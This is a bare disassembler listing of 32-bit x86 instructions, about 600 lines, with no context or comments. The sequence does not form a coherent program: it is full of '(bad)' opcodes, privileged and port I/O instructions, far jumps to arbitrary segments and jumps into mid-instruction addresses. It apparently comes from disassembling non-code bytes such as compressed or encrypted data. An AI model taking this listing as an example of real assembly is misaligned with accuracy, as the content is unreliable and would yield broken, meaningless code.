  403ebf:	xchg   BYTE PTR [esi],ch
  403ec1:	xchg   DWORD PTR [edi+0x3a],esi
  403ec4:	dec    esi
  403ec5:	rol    BYTE PTR [ebx+edx*1-0x786ca330],cl
  403ecc:	sub    eax,DWORD PTR [edx]
  403ece:	inc    ebp
  403ecf:	mov    ecx,0xc09837de
  403ed4:	in     eax,0x92
  403ed6:	xor    DWORD PTR [edi+esi*2+0x2eba5ab4],edx
  403edd:	out    dx,eax
  403ede:	ds pop es
  403ee0:	jo     0x403e9c
  403ee2:	fs pop edi
  403ee4:	jmp    0x403f08
  403ee6:	mov    edi,0x922931d8
  403eeb:	mov    ebp,0x7b44419d
  403ef0:	jge    0x403eae
  403ef2:	imul   esi,edi,0xd88f702c
  403ef8:	aas    
  403ef9:	addr16 clc 
  403efb:	stos   BYTE PTR es:[edi],al
  403efc:	mov    al,0xe2
  403efe:	shl    ebp,1
  403f00:	xchg   BYTE PTR [ebx-0x15],bl
  403f03:	(bad)  
  403f04:	out    dx,eax
  403f05:	shl    al,cl
  403f07:	pop    esi
  403f08:	ins    BYTE PTR es:[edi],dx
  403f09:	aas    
  403f0a:	cmp    eax,0x4e83ef30
  403f0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f10:	cmp    al,0x1d
  403f12:	sub    BYTE PTR [ecx+0x3bdd96b],cl
  403f18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f19:	fs jne 0x403efa
  403f1c:	dec    eax
  403f1d:	es mov bl,0x4f
  403f20:	push   esp
  403f21:	stc    
  403f22:	fwait
  403f23:	mov    ebp,0x3da0924b
  403f28:	xor    DWORD PTR [eax+0x386c4d8b],esp
  403f2e:	dec    ebx
  403f2f:	ltr    bp
  403f32:	or     BYTE PTR [ebx+0xe],cl
  403f35:	nop
  403f36:	shr    DWORD PTR [eax+0x2fb8fd65],cl
  403f3c:	shl    DWORD PTR [ecx-0x4629a423],cl
  403f42:	jb     0x403f1b
  403f44:	jbe    0x403f52
  403f46:	repnz cli 
  403f48:	inc    ebp
  403f49:	fmul   DWORD PTR [ecx-0x71]
  403f4c:	xchg   ecx,eax
  403f4d:	xor    dl,BYTE PTR [ebx+eax*8]
  403f50:	jno    0x403f53
  403f52:	mov    ah,0xb6
  403f54:	sub    al,0x1a
  403f56:	jo     0x403fba
  403f58:	xchg   ebx,eax
  403f59:	rol    BYTE PTR [ecx-0x72ea7847],1
  403f5f:	outs   dx,DWORD PTR ds:[esi]
  403f60:	imul   bl
  403f62:	fnstenv [ebp-0x4e4b4597]
  403f68:	int3   
  403f69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f6a:	mov    ax,0x544c
  403f6e:	mov    al,ds:0x3e94a131
  403f73:	mov    esi,edi
  403f75:	dec    esi
  403f76:	loopne 0x403f02
  403f78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f7a:	dec    ebp
  403f7b:	in     al,dx
  403f7c:	or     esi,DWORD PTR [esi-0x4d]
  403f7f:	sub    eax,0xa8531b90
  403f84:	shl    DWORD PTR [esi-0x7f187876],0xf9
  403f8b:	stos   DWORD PTR es:[edi],eax
  403f8c:	aam    0x75
  403f8e:	add    bl,BYTE PTR [eax+esi*4+0x27]
  403f92:	mov    esi,ds
  403f94:	addr16 mov al,0xd2
  403f97:	in     eax,dx
  403f98:	shr    BYTE PTR [ecx-0x4abdddae],1
  403f9e:	hlt    
  403f9f:	pop    edi
  403fa0:	(bad)  
  403fa1:	psraw  mm3,QWORD PTR [ebx-0x2b339d8d]
  403fa8:	(bad)  
  403fa9:	nop
  403faa:	test   eax,0xbe9a2275
  403faf:	aaa    
  403fb0:	pminsw mm4,QWORD PTR [esp+edi*2-0x5cf967eb]
  403fb8:	and    DWORD PTR [esp+edx*1-0x6b],0xffffffe0
  403fbd:	(bad)  
  403fbf:	mov    dl,0x55
  403fc1:	xchg   ecx,eax
  403fc2:	pop    ds
  403fc3:	js     0x404032
  403fc5:	popf   
  403fc6:	ja     0x403f5e
  403fc8:	arpl   WORD PTR [ecx+0x4c29cb0],sp
  403fce:	ds jb  0x403fed
  403fd1:	ja     0x403ff9
  403fd3:	call   DWORD PTR ds:0x382bce6c
  403fd9:	mov    ch,0xfc
  403fdb:	(bad)  
  403fdc:	ror    BYTE PTR [ecx],cl
  403fde:	stos   DWORD PTR es:[edi],eax
  403fdf:	mov    edi,0x5aae29d6
  403fe4:	push   ss
  403fe5:	repnz outs dx,DWORD PTR ds:[esi]
  403fe7:	xchg   ebp,eax
  403fe8:	ret    0xe029
  403feb:	fnsave [ecx+0x273e649b]
  403ff1:	mov    BYTE PTR [esp+ecx*1-0x3b21bb9a],bh
  403ff8:	jecxz  0x404056
  403ffa:	pop    edx
  403ffb:	pop    ecx
  403ffc:	stos   DWORD PTR es:[edi],eax
  403ffd:	pop    es
  403ffe:	xor    DWORD PTR [ebx],ebx
  404000:	mov    ah,0xfc
  404002:	test   al,0x7e
  404004:	xlat   BYTE PTR ds:[ebx]
  404005:	sti    
  404006:	mov    eax,ds:0x3f2f242a
  40400b:	sbb    eax,0x419277ee
  404010:	cmp    DWORD PTR [eax-0x72],0xffffffa0
  404014:	gs add al,0xa4
  404017:	lods   eax,DWORD PTR ds:[esi]
  404018:	jge    0x403fa6
  40401a:	js     0x404037
  40401c:	fidiv  WORD PTR [esi-0x42]
  40401f:	sbb    DWORD PTR [bp+si+0x6a],esi
  404023:	adc    esi,DWORD PTR [ebp+0x5d4beec7]
  404029:	retf   0x98c6
  40402c:	inc    esp
  40402d:	aas    
  40402e:	xchg   ecx,eax
  40402f:	ins    DWORD PTR es:[edi],dx
  404030:	dec    eax
  404031:	xchg   ebp,eax
  404032:	xor    eax,0xa47b6899
  404037:	push   cs
  404038:	(bad)  
  40403a:	dec    ecx
  40403b:	mov    al,0x94
  40403d:	loopne 0x403fc1
  40403f:	inc    esp
  404040:	test   DWORD PTR [ecx-0x5c0638f8],ebp
  404046:	adc    al,0x41
  404048:	sub    ah,0x9f
  40404b:	mov    esp,ebx
  40404d:	adc    eax,0x433f056c
  404052:	and    al,0x3c
  404054:	in     al,dx
  404055:	mov    eax,0x3faf3337
  40405a:	stos   BYTE PTR es:[edi],al
  40405b:	jle    0x4040cd
  40405d:	shl    cl,cl
  40405f:	pop    eax
  404060:	mov    dh,0x2b
  404062:	out    dx,al
  404063:	cmc    
  404064:	repnz lahf 
  404066:	or     edx,DWORD PTR [edi+0x2854ac61]
  40406c:	mov    WORD PTR fs:0x8100cd90,cs
  404073:	ret    0x8fb1
  404076:	push   edi
  404077:	mov    bl,0xf1
  404079:	pop    edi
  40407a:	pop    ds
  40407b:	inc    ebx
  40407c:	push   eax
  40407d:	jno    0x4040e3
  40407f:	fst    QWORD PTR [edx]
  404081:	mov    ch,0xb4
  404083:	imul   eax,DWORD PTR [esi+0x71afee33],0xcbd71af5
  40408d:	leave  
  40408e:	sub    DWORD PTR [ebx],edi
  404090:	ins    DWORD PTR es:[edi],dx
  404091:	jmp    0x5e70:0xc440ebaa
  404098:	inc    ecx
  404099:	push   esp
  40409a:	add    al,0xf7
  40409c:	mov    gs,WORD PTR [ebp-0x4b32f65b]
  4040a2:	add    eax,0xb69eceba
  4040a7:	and    al,0xd4
  4040a9:	ja     0x404038
  4040ab:	jle    0x4040c4
  4040ad:	outs   dx,DWORD PTR ds:[esi]
  4040ae:	push   eax
  4040af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040b0:	push   edx
  4040b1:	push   0xfffffff5
  4040b3:	or     DWORD PTR [esi-0x1dcc61d6],ecx
  4040b9:	push   cs
  4040ba:	or     eax,0xbf14921b
  4040bf:	and    BYTE PTR [ecx],cl
  4040c1:	pop    ds
  4040c2:	frstor [ecx-0x22]
  4040c5:	mov    esp,0xcb3a2b36
  4040ca:	ds sti 
  4040cc:	sbb    eax,esp
  4040ce:	push   esi
  4040cf:	cmp    dl,BYTE PTR [ebx+edi*4]
  4040d2:	hlt    
  4040d3:	or     dh,BYTE PTR [ebp+0xc]
  4040d6:	adc    ch,BYTE PTR [edi+0x21e1e975]
  4040dc:	sahf   
  4040dd:	inc    esi
  4040de:	popa   
  4040df:	fnstsw WORD PTR [esi]
  4040e1:	(bad)  
  4040e2:	sub    ecx,DWORD PTR [edx+eiz*2+0x2f46a905]
  4040e9:	dec    eax
  4040ea:	dec    eax
  4040eb:	(bad)  
  4040ec:	shr    edx,cl
  4040ee:	dec    ecx
  4040ef:	nop
  4040f0:	jp     0x404117
  4040f2:	outs   dx,BYTE PTR ds:[esi]
  4040f3:	(bad)  
  4040f4:	push   esp
  4040f5:	mov    dl,0x9a
  4040f7:	rol    edi,1
  4040f9:	or     BYTE PTR [eax+0x3dcaac2b],ch
  4040ff:	xor    eax,0x6d249982
  404104:	inc    edx
  404105:	(bad)  
  404106:	or     ebp,DWORD PTR [ecx]
  404108:	(bad)  
  404109:	fst    QWORD PTR [esi-0x44faecc1]
  40410f:	mov    ebp,0x710007ca
  404114:	push   ss
  404115:	int3   
  404116:	mov    BYTE PTR [ebp+edi*4+0x76af7054],bl
  40411d:	pushf  
  40411e:	mov    ds:0x5f959420,eax
  404123:	cmp    DWORD PTR [ebx-0x7b],esi
  404126:	(bad)  
  404127:	pusha  
  404128:	popa   
  404129:	pop    es
  40412a:	or     ebx,DWORD PTR [ecx-0x3e]
  40412d:	mov    ecx,0x6d37c6cc
  404132:	lds    esp,FWORD PTR [ecx]
  404134:	(bad)  
  404135:	loope  0x404132
  404137:	dec    ebx
  404138:	add    eax,0xaba49e8
  40413d:	lahf   
  40413e:	in     eax,dx
  40413f:	or     DWORD PTR [esi-0x4ef074b7],ebx
  404145:	fs (bad) 
  404147:	xchg   DWORD PTR [eax-0x17],edi
  40414a:	loope  0x404100
  40414c:	pop    es
  40414d:	fwait
  40414e:	into   
  40414f:	inc    ecx
  404150:	or     bl,dh
  404152:	addr16 mov ds:0x5d84,eax
  404156:	xchg   ebp,eax
  404157:	add    edi,DWORD PTR [esi-0x37]
  40415a:	pop    es
  40415b:	sub    DWORD PTR [eax],ebx
  40415d:	inc    eax
  40415e:	loopne 0x404114
  404160:	xchg   esi,eax
  404161:	nop
  404162:	pop    eax
  404163:	fbstp  TBYTE PTR [edi-0x44ff8b08]
  404169:	scas   eax,DWORD PTR es:[edi]
  40416a:	scas   al,BYTE PTR es:[edi]
  40416b:	test   edx,eax
  40416d:	xor    DWORD PTR [edx],edx
  40416f:	mov    esi,0x401ba21d
  404174:	dec    ebp
  404175:	sbb    al,0x4a
  404177:	xchg   DWORD PTR [esi+edx*8+0x22],esi
  40417b:	dec    esi
  40417c:	xchg   DWORD PTR [edx],edi
  40417e:	mov    edi,0x529563a1
  404183:	jmp    0x1f3c:0x8d5f46b
  40418a:	retf   
  40418b:	add    ah,BYTE PTR [edi+0x1ee8d708]
  404191:	push   ss
  404192:	and    dl,dl
  404194:	sbb    BYTE PTR [ebx+0x4b358ec1],0x81
  40419b:	jbe    0x4041ca
  40419d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40419e:	jge    0x40412d
  4041a0:	hlt    
  4041a1:	or     al,0xc6
  4041a3:	(bad)  
  4041a4:	xor    DWORD PTR [edi],edx
  4041a6:	xchg   ecx,eax
  4041a7:	pop    es
  4041a8:	push   edx
  4041a9:	jb     0x404207
  4041ab:	rcl    esp,1
  4041ad:	lock ret 
  4041af:	loope  0x404164
  4041b1:	retf   0xc79b
  4041b4:	mov    edx,fs
  4041b6:	inc    edx
  4041b7:	mov    ebx,0x7e72ae27
  4041bc:	mov    al,ds:0x2ff836a
  4041c1:	ja     0x404162
  4041c3:	jmp    0x404239
  4041c5:	dec    edi
  4041c6:	mov    ecx,0x33ead407
  4041cb:	js     0x40416c
  4041cd:	add    DWORD PTR [edi+0x1e],ebx
  4041d0:	fidiv  WORD PTR [ebp+0x5f1e1567]
  4041d6:	xor    al,0x8e
  4041d8:	xor    eax,edi
  4041da:	add    al,al
  4041dc:	xchg   edx,eax
  4041dd:	clc    
  4041de:	xchg   esi,eax
  4041df:	pop    edx
  4041e0:	loope  0x404219
  4041e2:	xor    BYTE PTR ss:[edx],0x8a
  4041e6:	pop    ebx
  4041e7:	mov    ?,WORD PTR [ebp-0x66]
  4041ea:	xor    eax,0x277058d5
  4041ef:	push   0xe866696a
  4041f4:	pop    edi
  4041f5:	mov    al,ds:0xbb8b472f
  4041fa:	pop    es
  4041fb:	outs   dx,BYTE PTR ds:[esi]
  4041fc:	loopne 0x404183
  4041fe:	in     al,0xb1
  404200:	pusha  
  404201:	mov    eax,DWORD PTR [esi-0x6282b28b]
  404207:	fldcw  WORD PTR [ebp+0x19e32fdf]
  40420d:	xor    eax,0xe4b6f465
  404212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404213:	ds mov eax,eax
  404216:	das    
  404217:	pop    ebx
  404218:	pop    ds
  404219:	shl    DWORD PTR [ecx-0x48],0x3f
  40421d:	rcl    BYTE PTR [esi+0x7f351cea],0x18
  404224:	adc    BYTE PTR [esi],al
  404226:	popa   
  404227:	out    0x79,eax
  404229:	xor    dh,bl
  40422b:	or     eax,0xaca02a73
  404230:	call   0xc1bdb510
  404235:	(bad)  
  404236:	dec    ebx
  404237:	dec    edi
  404238:	inc    eax
  404239:	pop    esi
  40423a:	dec    ebx
  40423b:	mov    bh,0xe0
  40423d:	xchg   esp,eax
  40423e:	push   esp
  40423f:	fwait
  404240:	outs   dx,DWORD PTR ds:[esi]
  404241:	inc    ebx
  404242:	addr16 xchg ebx,eax
  404244:	popf   
  404245:	inc    ebx
  404246:	push   ebp
  404247:	es jb  0x404248
  40424a:	push   0x3
  40424c:	jmp    0x77b3e1ba
  404251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404252:	call   0x64e1:0xa679e44d
  404259:	cdq    
  40425a:	(bad)  
  40425c:	add    esp,edi
  40425e:	(bad)  
  40425f:	mov    ebp,0xe5123548
  404264:	jl     0x40424f
  404266:	test   BYTE PTR [esi],ah
  404268:	cmp    DWORD PTR [esp],ecx
  40426b:	(bad)
  404270:	cmp    BYTE PTR [esi+0x6e4589ba],ah
  404276:	xor    eax,0x542ccf5d
  40427b:	sub    eax,0x4efadb06
  404280:	inc    ecx
  404281:	xchg   ebx,eax
  404282:	or     bl,BYTE PTR ds:0x863331a
  404288:	cmp    al,0x31
  40428a:	arpl   WORD PTR [ecx-0x6f40b27f],ax
  404290:	mov    ds:0x463e2a3a,al
  404295:	and    dl,0x1e
  404298:	dec    esi
  404299:	jne    0x404229
  40429b:	pushf  
  40429c:	xlat   BYTE PTR ds:[ebx]
  40429d:	(bad)  
  40429e:	or     al,0x58
  4042a0:	dec    eax
  4042a1:	retf   
  4042a2:	cdq    
  4042a3:	not    BYTE PTR [eax+eax*2-0x38175d63]
  4042aa:	push   eax
  4042ab:	pop    esp
  4042ac:	sub    al,0x7d
  4042ae:	mov    al,0x4e
  4042b0:	call   0xa118:0xa283b19d
  4042b7:	jo     0x40426c
  4042b9:	push   edx
  4042ba:	cli    
  4042bb:	sbb    eax,0x95b3fbd
  4042c0:	repz jne 0x404291
  4042c3:	std    
  4042c4:	test   al,0x44
  4042c6:	add    ecx,DWORD PTR ds:0xa1022ccb
  4042cc:	data16 and al,0xdd
  4042cf:	pop    es
  4042d0:	pop    ss
  4042d1:	mov    ah,0xa9
  4042d3:	and    al,0x18
  4042d5:	add    DWORD PTR [edi+0x5ffb660d],edi
  4042db:	outs   dx,BYTE PTR ds:[esi]
  4042dc:	jbe    0x404345
  4042de:	inc    ecx
  4042df:	sub    DWORD PTR [ebx],ebp
  4042e1:	pop    esi
  4042e2:	push   esp
  4042e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042e4:	bound  edx,QWORD PTR [edi]
  4042e6:	cmp    al,0xc5
  4042e8:	jmp    0x6bf9:0x8f9c99c2
  4042ef:	sahf   
  4042f0:	rcr    BYTE PTR [ebp+0x294323a3],1
  4042f6:	adc    ah,BYTE PTR [ecx]
  4042f8:	ror    ebx,cl
  4042fa:	and    ebp,ebp
  4042fc:	xchg   esi,eax
  4042fd:	inc    esp
  4042fe:	lea    eax,[ebx+0x51e42b16]
  404304:	test   BYTE PTR [ecx+0x1],ch
  404307:	push   eax
  404308:	out    0x44,al
  40430a:	in     eax,0x31
  40430c:	test   eax,0x4d514257
  404311:	xchg   esp,eax
  404312:	push   ebp
  404313:	mov    bl,0xd9
  404315:	repnz fwait
  404317:	adc    DWORD PTR [ecx+ecx*8-0x5b],ecx
  40431b:	rcr    BYTE PTR [eax+0x73b402f],cl
  404321:	les    ecx,FWORD PTR [esi]
  404323:	adc    edx,esp
  404325:	mov    fs,edx
  404327:	mov    bl,ah
  404329:	loopne 0x4042cf
  40432b:	inc    ebx
  40432c:	fyl2xp1 
  40432e:	pop    ss
  40432f:	ds xchg ecx,eax
  404331:	test   eax,0x8951afbc
  404336:	aam    0xd2
  404338:	push   edx
  404339:	cs call 0xa738:0xa27284e1
  404341:	mov    eax,0x5d54b2fe
  404346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404347:	mov    bh,0x81
  404349:	adc    al,dl
  40434b:	cmc    
  40434c:	call   DWORD PTR [eax-0x2fbf2aff]
  404352:	pop    eax
  404353:	ror    BYTE PTR [esi+0xc],1
  404356:	sbb    cl,bl
  404358:	ficomp DWORD PTR [eax+0x3c611b86]
  40435e:	pop    edx
  40435f:	loopne 0x404384
  404361:	inc    ecx
  404362:	es pop ds
  404364:	sub    BYTE PTR [esp+ebp*2+0x6c],ch
  404368:	or     al,0xce
  40436a:	cwde   
  40436b:	ins    DWORD PTR es:[edi],dx
  40436c:	pusha  
  40436d:	test   BYTE PTR [ebp+eax*8-0x431fb5b8],ch
  404374:	std    
  404375:	mov    esi,0x61596138
  40437a:	and    eax,edx
  40437c:	inc    ebp
  40437d:	repz dec edi
  40437f:	adc    BYTE PTR [ebx],al
  404381:	jp     0x404393
  404383:	mov    cl,0x41
  404385:	sbb    cl,BYTE PTR [ebp-0x5c7962ea]
  40438b:	xlat   BYTE PTR ds:[ebx]
  40438c:	xor    dx,WORD PTR [ebp+ebx*1-0x1c332d77]
  404394:	dec    edi
  404395:	cmp    dl,BYTE PTR ss:[ebx-0x5c]
  404399:	sbb    esp,edx
  40439b:	pop    ecx
  40439c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40439d:	and    bh,ch
  40439f:	mov    ss,WORD PTR ds:0x1c97158d
  4043a5:	cmp    DWORD PTR [esi-0x7c],edx
  4043a8:	cmp    BYTE PTR ds:0x7986cba2,ah
  4043ae:	push   cs
  4043af:	mov    edx,DWORD PTR [edi+0x5dbce9a5]
  4043b5:	inc    edi
  4043b6:	and    eax,esp
  4043b8:	and    DWORD PTR [edx+0x64034bac],ebp
  4043be:	rcl    DWORD PTR [ebp+0xc],1
  4043c1:	cmp    ebx,DWORD PTR [eax+0x51d87a57]
  4043c7:	ror    BYTE PTR [ebx-0x56],0x5e
  4043cb:	xor    BYTE PTR [ecx-0x7b],0x70
  4043cf:	jne    0x4043a8
  4043d1:	out    0xdc,eax
  4043d3:	dec    edi
  4043d4:	popa   
  4043d5:	fst    DWORD PTR [edi+ebx*8]
  4043d8:	sbb    ebx,0x5e
  4043db:	fst    DWORD PTR [edi+0x27d2c686]
  4043e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043e2:	push   0xcb2dc058
  4043e7:	adc    bh,0x77
  4043ea:	jns    0x4043b4
  4043ec:	stos   DWORD PTR es:[edi],eax
  4043ed:	mov    eax,ds:0xf9f3cbae
  4043f2:	inc    edx
  4043f3:	pop    eax
  4043f4:	cmp    eax,edx
  4043f6:	jbe    0x404424
  4043f8:	mov    esp,0x911e1850
  4043fd:	adc    bl,cl
  4043ff:	pop    ebp
  404400:	push   esi
  404401:	jne    0x4043ff
  404403:	push   ds
  404404:	dec    ecx
  404405:	xor    DWORD PTR [ecx+ecx*4-0x46acd99c],ebp
  40440c:	jp     0x4043af
  40440e:	(bad)  
  40440f:	lds    edi,FWORD PTR [eax+eax*2+0x2922e976]
  404416:	mov    ah,0x19
  404418:	(bad)  
  404419:	lods   eax,DWORD PTR ds:[esi]
  40441a:	jp     0x4043c4
  40441c:	out    0x7c,al
  40441e:	mov    DWORD PTR [ecx],edx
  404420:	jecxz  0x404436
  404422:	aad    0x52
  404424:	cmp    DWORD PTR [eax],eax
  404426:	dec    edi
  404427:	addr16 fs and dl,0x3d
  40442c:	cdq    
  40442d:	(bad)  
  40442f:	push   ebp
  404430:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404431:	std    
  404432:	cmp    ebx,ecx
  404434:	dec    edi
  404435:	ins    DWORD PTR es:[edi],dx
  404436:	cmp    dh,BYTE PTR [ebp+0x49]
  404439:	xchg   ecx,eax
  40443a:	data16 add al,0xc8
  40443d:	pusha  
  40443e:	mov    ebx,DWORD PTR [ebp+0x44]
  404441:	push   0xadea770d
  404446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404447:	sti    
  404448:	cmp    eax,0x5488e221
  40444d:	mov    ah,0xc7
  40444f:	sar    edi,cl
  404451:	arpl   WORD PTR [ebp+0x6e1b1a08],bx
  404457:	adc    al,0x6c
  404459:	mov    ah,0x9f
  40445b:	pop    ebp
  40445c:	dec    ebp
  40445d:	aas    
  40445e:	jnp    0x404477
  404460:	xor    DWORD PTR [ebx-0x64],ebx
  404463:	jo     0x4043f3
  404465:	mov    esp,0x147ed207
  40446a:	sbb    DWORD PTR [eax],edi
  40446c:	lods   eax,DWORD PTR ds:[esi]
  40446d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40446e:	add    bh,BYTE PTR [eax-0x70c7a073]
  404474:	arpl   WORD PTR [esi],dx
  404476:	or     dl,ah
  404478:	cmp    ebx,0x7d96bbc4
  40447e:	jg     0x404468
  404480:	sahf   
  404481:	pop    ds
  404482:	mov    ebx,DWORD PTR [ecx-0x6c056b6]
  404488:	idiv   esi
  40448a:	pusha  
  40448b:	lods   eax,DWORD PTR ds:[esi]
  40448c:	cmp    al,0xc1
  40448e:	sahf   
  40448f:	add    ebp,DWORD PTR [ecx]
  404491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404492:	clc    
  404493:	stos   DWORD PTR es:[edi],eax
  404494:	in     al,0x4a
  404496:	pushf  
  404497:	mul    bh
  404499:	jmp    DWORD PTR [esp+esi*2-0x27408dec]
  4044a0:	jmp    0x11f709e8
  4044a5:	lods   al,BYTE PTR ds:[esi]
  4044a6:	stos   DWORD PTR es:[edi],eax
  4044a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044a8:	(bad)  
  4044a9:	in     al,0x76
  4044ab:	stos   DWORD PTR es:[edi],eax
  4044ac:	and    al,0xc9
  4044ae:	call   0xd1f2:0x59cd693a
  4044b5:	push   esp
  4044b6:	ins    DWORD PTR es:[edi],dx
  4044b7:	in     eax,0x75
  4044b9:	pop    eax
  4044ba:	fwait
  4044bb:	push   esp
  4044bc:	and    ah,BYTE PTR [eax-0x3531bd3f]
  4044c2:	and    ebx,eax
  4044c4:	(bad)  
  4044c5:	inc    esp
  4044c6:	(bad)  
  4044c8:	nop
  4044c9:	inc    ebp
  4044ca:	push   ss
  4044cb:	jns    0x404530
  4044cd:	cmc    
  4044ce:	js     0x404502
  4044d0:	mov    ah,0x5f
  4044d2:	mov    edx,0x152e72e1
  4044d7:	adc    eax,0x61e87ee1
  4044dc:	jle    0x4044fe
  4044de:	dec    ebx
  4044df:	push   ebp
  4044e0:	mov    ch,0xe9
  4044e2:	loopne 0x40447e
  4044e4:	sub    BYTE PTR [ebx],0xa6
  4044e7:	(bad)  
  4044e9:	pop    ss
  4044ea:	cmp    BYTE PTR fs:[eax],bh
  4044ed:	cmp    eax,0xb0700b25
  4044f2:	or     al,0xdb
  4044f4:	xor    al,0x7a
  4044f6:	push   ss
  4044f7:	and    ebx,edx
  4044f9:	and    DWORD PTR [esi],ebp
  4044fb:	or     al,0x53
  4044fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044fe:	cdq    
  4044ff:	stos   DWORD PTR es:[edi],eax
  404500:	push   ss
  404501:	inc    ecx
  404502:	xor    eax,0x2b597dfd
  404507:	adc    ebp,ebp
  404509:	add    eax,0x644ceeae
  40450e:	in     al,dx
  40450f:	cdq    
  404510:	dec    DWORD PTR [edx+0x79]
  404513:	push   ebx
  404514:	adc    BYTE PTR [esi],bh
  404516:	and    al,0xc6
  404518:	jp     0x404556
  40451a:	punpckhdq mm1,mm5
  40451d:	aad    0x38
  40451f:	add    al,0xd2
  404521:	xor    al,0x3c
  404523:	retf   
  404524:	sub    BYTE PTR [esi],ah
  404526:	push   edi
  404527:	jo     0x4044cf
  404529:	push   ss
  40452a:	xchg   esi,eax
  40452b:	xchg   BYTE PTR [edx+ecx*2],cl
  40452e:	sar    DWORD PTR [eax],0xbe
  404531:	sub    al,0x29
  404533:	in     eax,dx
  404534:	mov    bh,0x12
  404536:	scas   al,BYTE PTR es:[edi]
  404537:	fmulp  st(1),st
  404539:	sub    eax,0xdb118304
  40453e:	pop    ecx
  40453f:	cmp    BYTE PTR [eax-0x3bff08bc],dh
  404545:	lds    ebp,FWORD PTR ds:0x14513af3
  40454b:	xchg   dh,al
  40454d:	push   es
  40454e:	push   ebx
  40454f:	mov    bl,0x6c
  404551:	pcmpgtd mm4,mm6
  404554:	jnp    0x404570
  404556:	mov    DWORD PTR [ecx+0x3d],edi
  404559:	inc    esp
  40455a:	mov    dl,0xef
  40455c:	xchg   edx,eax
  40455d:	jo     0x4045d1
  40455f:	ins    DWORD PTR es:[edi],dx
  404560:	xchg   esi,eax
  404561:	mov    BYTE PTR [esi],cl
  404563:	sub    ah,al
  404565:	test   BYTE PTR [ebx-0x5477196c],dl
  40456b:	mov    esi,0x1346733e
  404570:	(bad)  [eax+edi*8-0x65]
  404574:	pop    ebx
  404575:	(bad)  
  404576:	sub    eax,0xc2acc744
  40457b:	fwait
  40457c:	shr    DWORD PTR [ecx],0x2f
  40457f:	loop   0x40459c
  404581:	mov    cl,0xa4
  404583:	fbstp  TBYTE PTR [eax-0x2d]
  404586:	iret   
  404587:	lahf   
  404588:	mov    edi,0xc26d9b09
  40458d:	cmp    al,BYTE PTR [ecx+0x6e]
  404590:	jp     0x40452b
  404592:	mov    esp,0xc9c6f2bc
  404597:	push   ecx
  404598:	fst    QWORD PTR [ebp+0x1a943382]
  40459e:	or     al,0x4a
  4045a0:	push   eax
  4045a1:	shr    DWORD PTR [ecx+0x119cac54],1
  4045a7:	aaa    
  4045a8:	fs add al,0x20
  4045ab:	mov    dh,bl
  4045ad:	inc    edx
  4045ae:	pop    eax
  4045af:	cli    
  4045b0:	jo     0x4045db
  4045b2:	sbb    BYTE PTR [eax+eiz*2+0x4cca4a05],bh
  4045b9:	sbb    ebp,DWORD PTR [edx+0x60826e8c]
  4045bf:	int    0x39
  4045c1:	cmp    al,BYTE PTR [edi+edi*1]
  4045c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045c5:	sub    edx,edx
  4045c7:	push   edx
  4045c8:	mov    eax,0x99da18a8
  4045cd:	cs inc ecx
  4045cf:	retf   0xa5e
  4045d2:	xchg   esi,eax
  4045d3:	mov    cs,WORD PTR [ebx]
  4045d5:	xor    eax,DWORD PTR [edx]
  4045d7:	(bad)  
  4045d8:	pop    ecx
  4045d9:	sti    
  4045da:	loop   0x40458a
  4045dc:	dec    ebx
  4045dd:	js     0x4045a0
  4045df:	mov    al,0xf7
  4045e1:	xchg   BYTE PTR [ebx+ecx*4],ah
  4045e4:	shl    DWORD PTR [edx-0x42],1
  4045e7:	pop    ecx
  4045e8:	jo     0x40459d
  4045ea:	in     eax,0x14
  4045ec:	ret    0x1ddd
  4045ef:	pop    ss
  4045f0:	xor    ebp,esp
  4045f2:	adc    ch,BYTE PTR es:[edx-0x1782f583]
  4045f9:	loope  0x404649
  4045fb:	into   
  4045fc:	rol    BYTE PTR [edi+0x60],1
  4045ff:	pop    eax
  404600:	fcmove st,st(1)
  404602:	or     ebx,DWORD PTR [eax]
  404604:	sbb    eax,0x2489774b
  404609:	pop    edi
  40460a:	pop    edi
  40460b:	sub    eax,DWORD PTR ds:0x7bf1a750
  404611:	rol    DWORD PTR [eax-0x7bf43c48],1
  404617:	xchg   esi,ecx
  404619:	push   0xffffff89
  40461b:	sbb    al,0x4c
  40461d:	fsubr  st,st(7)
  40461f:	fcomip st,st(3)
  404621:	dec    eax
  404622:	xchg   esp,eax
  404623:	mov    ah,0xa1
  404625:	out    dx,al
  404626:	ret    0xa630
  404629:	add    DWORD PTR [ebx],esi
  40462b:	leave  
  40462c:	push   ebp
  40462d:	dec    BYTE PTR [eax]
  40462f:	push   ds
  404630:	scas   al,BYTE PTR es:[edi]
  404631:	cdq    
  404632:	cmp    ch,dh
  404634:	adc    dh,0x79
  404637:	(bad)  
  404638:	fwait
  404639:	mov    DWORD PTR [esi+0x31],ebp
  40463c:	and    eax,0xbcf84c47
  404641:	int    0x95
  404643:	sub    esp,edx
  404645:	mov    eax,edi
  404647:	xchg   ebp,eax
  404648:	ret    
  404649:	pop    ds
  40464a:	int3   
  40464b:	popf   
  40464c:	repz sub DWORD PTR [edi+0x7b],ecx
  404650:	jg     0x404688
  404652:	xlat   BYTE PTR ds:[ebx]
  404653:	adc    ah,BYTE PTR [edx-0x12]
  404656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404657:	hlt    
